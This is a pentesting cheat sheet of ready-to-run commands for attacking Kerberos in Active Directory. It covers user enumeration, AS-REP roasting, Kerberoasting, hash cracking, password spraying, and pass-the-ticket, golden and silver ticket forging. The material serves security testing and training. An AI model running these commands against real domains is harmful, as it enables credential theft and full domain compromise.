# Port 88 - Kerberos

## Table of Contents

- [Enumeration](#enumeration)
  - [Nmap Scripts](#nmap-scripts)
  - [User Enumeration](#user-enumeration)
- [Attacks](#attacks)
  - [AS-REP Roasting](#as-rep-roasting)
  - [Kerberoasting](#kerberoasting)
  - [Password Spraying](#password-spraying)
- [Tools](#tools)

---

## Enumeration

### Nmap Scripts

```shell
# Service detection
nmap -p 88 -sV $rhost

# Kerberos user enumeration
nmap -p 88 --script krb5-enum-users --script-args krb5-enum-users.realm=$domain $rhost
```

### User Enumeration

```shell
# Kerbrute
kerbrute userenum -d $domain --dc $rhost users.txt

# Nmap
nmap -p 88 --script krb5-enum-users --script-args krb5-enum-users.realm=$domain,userdb=users.txt $rhost
```

---

## Attacks

> **📚 For complete Kerberos attack methodology, theory, and advanced techniques, see [Kerberos Attacks](../../3.AD-Exploit/3.3.Kerberos-Attacks.md)**

### AS-REP Roasting

> Targets users with "Do not require Kerberos preauthentication" enabled

```shell
# Impacket - Get AS-REP hash
impacket-GetNPUsers $domain/ -dc-ip $rhost -usersfile users.txt -format hashcat -outputfile asrep.txt

# With credentials
impacket-GetNPUsers $domain/$user:$password -dc-ip $rhost -request

# Rubeus (Windows)
.\Rubeus.exe asreproast /format:hashcat /outfile:asrep.txt

# Crack with hashcat
hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt
```

### Kerberoasting

> Targets Service Principal Names (SPNs)

```shell
# Impacket - Get TGS ticket
impacket-GetUserSPNs $domain/$user:$password -dc-ip $rhost -request

# Save to file
impacket-GetUserSPNs $domain/$user:$password -dc-ip $rhost -request -outputfile tgs.txt

# Rubeus (Windows)
.\Rubeus.exe kerberoast /outfile:tgs.txt

# Crack with hashcat
hashcat -m 13100 tgs.txt /usr/share/wordlists/rockyou.txt
```

### Password Spraying

```shell
# Kerbrute
kerbrute passwordspray -d $domain --dc $rhost users.txt 'Password123!'

# NetExec
netexec smb $rhost -u users.txt -p 'Password123!' --continue-on-success
```

---

## Tools

### Kerbrute

```shell
# User enumeration
kerbrute userenum -d $domain --dc $rhost users.txt

# Password spray
kerbrute passwordspray -d $domain --dc $rhost users.txt 'Password123!'

# Brute force
kerbrute bruteuser -d $domain --dc $rhost passwords.txt username
```

### Impacket

```shell
# Get TGT
impacket-getTGT $domain/$user:$password -dc-ip $rhost

# Get ST (Service Ticket)
impacket-getST $domain/$user:$password -spn cifs/$rhost -dc-ip $rhost

# Use ticket
export KRB5CCNAME=ticket.ccache
impacket-psexec -k -no-pass $domain/$user@$rhost
```

### Rubeus (Windows)

```shell
# AS-REP Roast
.\Rubeus.exe asreproast /format:hashcat

# Kerberoast
.\Rubeus.exe kerberoast /outfile:kerberoast.txt

# Request TGT
.\Rubeus.exe asktgt /user:$user /password:$password /domain:$domain

# Pass-the-Ticket
.\Rubeus.exe ptt /ticket:ticket.kirbi
```

---

## Ticket Manipulation

> **📚 For complete Golden/Silver Ticket theory and advanced usage, see [Kerberos Attacks](../../3.AD-Exploit/3.3.Kerberos-Attacks.md#golden-ticket)**

### Pass-the-Ticket

```shell
# Export tickets (Mimikatz)
sekurlsa::tickets /export

# Import ticket
kerberos::ptt ticket.kirbi

# Verify
klist
```

### Golden Ticket

```shell
# Requires krbtgt NTLM hash
kerberos::golden /user:Administrator /domain:$domain /sid:$domain_sid /krbtgt:$krbtgt_hash /ptt
```

### Silver Ticket

```shell
# Requires service account NTLM hash
kerberos::golden /user:Administrator /domain:$domain /sid:$domain_sid /target:$rhost /service:cifs /rc4:$service_hash /ptt
```
